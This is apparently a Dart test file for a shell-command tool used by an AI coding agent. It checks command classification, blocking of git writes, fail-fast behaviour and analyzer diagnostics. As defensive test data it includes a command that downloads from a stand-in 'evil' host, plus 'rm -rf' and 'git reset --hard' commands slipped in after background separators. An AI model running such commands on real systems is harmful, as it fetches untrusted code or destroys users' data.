import 'dart:convert';
import 'dart:io';

import 'package:caverno/features/chat/data/datasources/local_shell_tools.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  _diagnosticsTests();
  group('implicit errexit', () {
    late Directory tempDir;

    setUp(() {
      tempDir = Directory.systemTemp.createTempSync('caverno_shell_');
    });

    tearDown(() {
      if (tempDir.existsSync()) tempDir.deleteSync(recursive: true);
    });

    Future<int?> exitCodeOf(String command) async {
      final raw = await LocalShellTools.execute(
        command: command,
        workingDirectory: tempDir.path,
      );
      return (jsonDecode(raw) as Map<String, dynamic>)['exit_code'] as int?;
    }

    test('a negated check inside a subshell still reports success', () async {
      // Observed live: an acceptance walk-through ending in
      // `(! prog unknown-id)` passed every step yet reported exit 1, because
      // `sh -e` aborts inside the subshell before `!` inverts the status. The
      // model then explained the failure away instead of trusting it.
      expect(
        await exitCodeOf('true && (! false) && (! false)'),
        0,
        reason: 'the negated checks passed, so the chain passed',
      );
    });

    test('a bare negated command reports success', () async {
      expect(await exitCodeOf('true && ! false'), 0);
    });

    test('a genuine failure in an && chain still fails', () async {
      expect(
        await exitCodeOf('true && false && true'),
        isNot(0),
        reason: 'dropping -e must not hide a real failure',
      );
    });

    test('a failing negated check fails', () async {
      expect(await exitCodeOf('true && (! true)'), isNot(0));
    });
  });

  test('normalizes model control tokens from commands', () {
    expect(
      LocalShellTools.normalizeCommand('<|"|>pip install psutil<|"|>'),
      'pip install psutil',
    );
  });

  test('marks simple inspection commands as read-only', () {
    expect(LocalShellTools.isReadOnly('pwd'), isTrue);
    expect(LocalShellTools.isReadOnly('ls -la'), isTrue);
    expect(
      LocalShellTools.isReadOnly(
        "ls -R && echo '--- pubspec.yaml content ---' && cat pubspec.yaml",
      ),
      isTrue,
    );
    expect(LocalShellTools.isReadOnly('rg ChatPage lib'), isTrue);
    expect(LocalShellTools.isReadOnly('git status --short'), isTrue);
  });

  test('marks mutating or shell-heavy commands as requiring approval', () {
    expect(LocalShellTools.isReadOnly('flutter test'), isFalse);
    expect(LocalShellTools.isReadOnly('rm -rf build'), isFalse);
    expect(LocalShellTools.isReadOnly('rg ChatPage lib | head'), isFalse);
    expect(
      LocalShellTools.isReadOnly(r'echo $CAVERNO_SESSION_LOG_DIR'),
      isFalse,
    );
    expect(LocalShellTools.isReadOnly('sed -i s/foo/bar/g file.txt'), isFalse);
    expect(
      LocalShellTools.isReadOnly('grep foo bar & rm -rf /tmp/caverno_probe'),
      isFalse,
    );
    expect(
      LocalShellTools.isReadOnly(
        'awk "{print}" f & curl http://evil/x -o /tmp/z',
      ),
      isFalse,
    );
  });

  test('detects direct git writes in local shell commands', () async {
    final raw = await LocalShellTools.execute(
      command: 'cd /tmp && git merge feature/python-hello-world-3',
      workingDirectory: Directory.systemTemp.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['code'], 'local_shell_git_write_blocked');
    expect(result['git_subcommand'], 'merge feature/python-hello-world-3');
    expect(result['required_action'], contains('git_finish_worktree_session'));
  });

  test('does not block direct git read commands', () {
    final blockedResult = LocalShellTools.gitWriteCommandBlockedResult(
      command: 'git -C /tmp status --short',
      workingDirectory: Directory.systemTemp.path,
    );

    expect(blockedResult, isNull);
  });

  test('detects direct git writes after background separators', () {
    final blockedResult = LocalShellTools.gitWriteCommandBlockedResult(
      command: 'grep needle pubspec.yaml & git reset --hard',
      workingDirectory: Directory.systemTemp.path,
    );

    expect(blockedResult, isNotNull);
    final result = jsonDecode(blockedResult!) as Map<String, dynamic>;
    expect(result['code'], 'local_shell_git_write_blocked');
    expect(result['git_subcommand'], 'reset --hard');
  });

  test('executes chained read-only commands internally', () async {
    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    await File('${tempDir.path}/pubspec.yaml').writeAsString('name: sample\n');
    final libDir = Directory('${tempDir.path}/lib')
      ..createSync(recursive: true);
    await File('${libDir.path}/main.dart').writeAsString('void main() {}\n');

    final raw = await LocalShellTools.execute(
      command:
          "ls -R && echo '--- pubspec.yaml content ---' && cat pubspec.yaml",
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], 0);
    expect(result['executed_internally'], isTrue);
    expect(result['stdout'], contains('.:'));
    expect(result['stdout'], contains('lib:'));
    expect(result['stdout'], contains('pubspec.yaml'));
    expect(result['stdout'], contains('--- pubspec.yaml content ---'));
    expect(result['stdout'], contains('name: sample'));
  });

  test('stops a multi-command batch at the first failure', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_batch_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final raw = await LocalShellTools.execute(
      command: 'touch first.txt\nfalse\ntouch second.txt',
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], isNot(0));
    expect(File('${tempDir.path}/first.txt').existsSync(), isTrue);
    expect(File('${tempDir.path}/second.txt').existsSync(), isFalse);
  });

  test('preserves explicit exit status handling after a failure', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_status_handling_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final raw = await LocalShellTools.execute(
      command: "sh -c 'exit 7'; test \$? -eq 7",
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], 0);
    expect(result['stderr'], isEmpty);
  });

  test('preserves explicit or-list recovery after a failure', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_or_list_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final raw = await LocalShellTools.execute(
      command: "false || printf 'recovered\\n'",
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], 0);
    expect(result['stdout'], 'recovered\n');
    expect(result['stderr'], isEmpty);
  });

  test('preserves a newline after a trailing shell comment', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_comment_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final raw = await LocalShellTools.execute(
      command: 'echo build # step 1\ncat missing.txt\necho false-green',
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], isNot(0));
    expect(result['stdout'], 'build\n');
    expect(result['stdout'], isNot(contains('false-green')));
    expect(result['executed_internally'], isNull);
  });

  test(
    'ignores quoted and commented semicolons when enabling fail-fast',
    () async {
      if (Platform.isWindows) {
        return;
      }

      final tempDir = await Directory.systemTemp.createTemp(
        'local_shell_tools_comment_semicolon_test_',
      );
      addTearDown(() async {
        if (tempDir.existsSync()) {
          await tempDir.delete(recursive: true);
        }
      });

      final raw = await LocalShellTools.execute(
        command:
            "printf ';\\n' # comment ; not a command\nfalse\nprintf 'false-green\\n'",
        workingDirectory: tempDir.path,
      );

      final result = jsonDecode(raw) as Map<String, dynamic>;
      expect(result['exit_code'], isNot(0));
      expect(result['stdout'], ';\n');
      expect(result['stdout'], isNot(contains('false-green')));
    },
  );

  test('preserves heredoc delimiters and content', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_heredoc_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final raw = await LocalShellTools.execute(
      command: "cat <<'EOF' > generated.txt\nfirst line\nsecond line\nEOF",
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], 0);
    expect(result['stderr'], isEmpty);
    expect(
      await File('${tempDir.path}/generated.txt').readAsString(),
      'first line\nsecond line\n',
    );
  });

  test('preserves multiline shell control flow', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_control_flow_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final raw = await LocalShellTools.execute(
      command: '''
for value in first second; do
  printf '%s\\n' "\$value"
done
if [ -d . ]; then
  printf 'directory\\n'
fi
''',
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], 0);
    expect(result['stdout'], 'first\nsecond\ndirectory\n');
    expect(result['stderr'], isEmpty);
  });

  test('accepts ls -F for portable directory inspection', () async {
    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_ls_flag_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    await File('${tempDir.path}/README.md').writeAsString('hello\n');
    final srcDir = Directory('${tempDir.path}/src')..createSync();

    final raw = await LocalShellTools.execute(
      command: 'ls -F',
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], 0);
    expect(result['executed_internally'], isTrue);
    expect(result['stdout'], contains('README.md'));
    expect(result['stderr'], isEmpty);
    expect(result['stdout'], isNot(contains('unsupported option')));
    expect(srcDir.existsSync(), isTrue);
  });

  test('uses the platform shell for shell expansion syntax', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_shell_syntax_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    await File('${tempDir.path}/README.md').writeAsString('hello\n');

    final raw = await LocalShellTools.execute(
      command: 'ls -la "${tempDir.path}" 2>/dev/null | head -20',
      workingDirectory: tempDir.path,
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['exit_code'], 0);
    expect(result['executed_internally'], isNull);
    expect(result['stdout'], contains('README.md'));
    expect(result['stderr'], isEmpty);
  });

  test('terminates shell commands that exceed the timeout', () async {
    if (Platform.isWindows) {
      return;
    }

    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_timeout_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final raw = await LocalShellTools.execute(
      command: 'sleep 2',
      workingDirectory: tempDir.path,
      timeout: const Duration(milliseconds: 100),
    );

    final result = jsonDecode(raw) as Map<String, dynamic>;
    expect(result['command'], 'sleep 2');
    expect(result['timed_out'], isTrue);
    expect(result['timeout_ms'], 100);
    expect(result['process_terminated'], isTrue);
    expect(result['error'], contains('100 milliseconds'));
  });

  test('executes head, tail, wc, find, and rg internally', () async {
    final tempDir = await Directory.systemTemp.createTemp(
      'local_shell_tools_extended_test_',
    );
    addTearDown(() async {
      if (tempDir.existsSync()) {
        await tempDir.delete(recursive: true);
      }
    });

    final libDir = Directory('${tempDir.path}/lib')
      ..createSync(recursive: true);
    final nestedDir = Directory('${libDir.path}/nested')
      ..createSync(recursive: true);
    await File(
      '${libDir.path}/main.dart',
    ).writeAsString('alpha\nbeta\ngamma\ndelta\n');
    await File(
      '${nestedDir.path}/feature.txt',
    ).writeAsString('first line\nsecond line\nthird line\n');

    final head =
        jsonDecode(
              await LocalShellTools.execute(
                command: 'head -n 2 lib/main.dart',
                workingDirectory: tempDir.path,
              ),
            )
            as Map<String, dynamic>;
    expect(head['executed_internally'], isTrue);
    expect(head['stdout'], 'alpha\nbeta\n');

    final tail =
        jsonDecode(
              await LocalShellTools.execute(
                command: 'tail -n 2 lib/main.dart',
                workingDirectory: tempDir.path,
              ),
            )
            as Map<String, dynamic>;
    expect(tail['stdout'], 'gamma\ndelta\n');

    final wc =
        jsonDecode(
              await LocalShellTools.execute(
                command: 'wc -lwc lib/main.dart',
                workingDirectory: tempDir.path,
              ),
            )
            as Map<String, dynamic>;
    expect(wc['stdout'], contains('4'));
    expect(wc['stdout'], contains('lib/main.dart'));

    final find =
        jsonDecode(
              await LocalShellTools.execute(
                command: 'find lib -type f -name *.txt',
                workingDirectory: tempDir.path,
              ),
            )
            as Map<String, dynamic>;
    expect(find['stdout'], contains('./nested/feature.txt'));

    final rg =
        jsonDecode(
              await LocalShellTools.execute(
                command: 'rg second lib',
                workingDirectory: tempDir.path,
              ),
            )
            as Map<String, dynamic>;
    expect(rg['stdout'], contains('nested/feature.txt:2:second line'));
  });
}

void _diagnosticsTests() {
  group('diagnostics attached to a failing command', () {
    late Directory tempDir;

    setUp(() {
      tempDir = Directory.systemTemp.createTempSync('caverno_shell_diag_');
      File('${tempDir.path}/pubspec.yaml').writeAsStringSync(
        'name: diag_fixture\nenvironment:\n  sdk: ">=3.0.0 <4.0.0"\n',
      );
    });

    tearDown(() {
      if (tempDir.existsSync()) tempDir.deleteSync(recursive: true);
    });

    Future<Map<String, dynamic>> run(String command) async {
      final raw = await LocalShellTools.execute(
        command: command,
        workingDirectory: tempDir.path,
        timeout: const Duration(seconds: 90),
      );
      return jsonDecode(raw) as Map<String, dynamic>;
    }

    void writeSource(String body) {
      Directory('${tempDir.path}/lib').createSync(recursive: true);
      File('${tempDir.path}/lib/main.dart').writeAsStringSync(body);
    }

    // Completion evidence counts a `diagnostics` list on a tool result. Until
    // this existed, a model that verified by running the analyzer through this
    // tool produced errors the harness could show but not count.
    test('reads them out of a failing dart analyze', () async {
      writeSource('void main() { undefinedFunction(); }\n');

      final result = await run('dart analyze');
      expect(result['exit_code'], isNot(0));

      final diagnostics = result['diagnostics'] as List?;
      expect(diagnostics, isNotNull, reason: '${result['stdout']}');
      final first = diagnostics!.first as Map<String, dynamic>;
      expect(first['severity'], 'Error');
      expect(first['relative_path'], 'lib/main.dart');
      expect(first['line'], 1);
    });

    test('stays absent when dart analyze passes', () async {
      writeSource('void main() {}\n');

      final result = await run('dart analyze');
      expect(result['exit_code'], 0);
      expect(result['diagnostics'], isNull);
    });

    test('stays absent for a failing command that is not dart or flutter', () async {
      // The parsers only know Dart and Flutter syntax, and every diagnostic
      // raises the unresolved-error count that goal completion gaps are built
      // from. A command that happens to print an analyzer-shaped line must not
      // become evidence of unresolved Dart errors.
      const analyzerLine =
          'ERROR|COMPILE_TIME_ERROR|UNDEFINED_METHOD|'
          'lib/main.dart|12|7|9|The method is not defined.';

      final result = await run("printf '%s\\n' '$analyzerLine'; exit 1");
      expect(result['exit_code'], 1);
      expect(result['stdout'], contains('UNDEFINED_METHOD'));
      expect(result['diagnostics'], isNull);
    });
  });
}
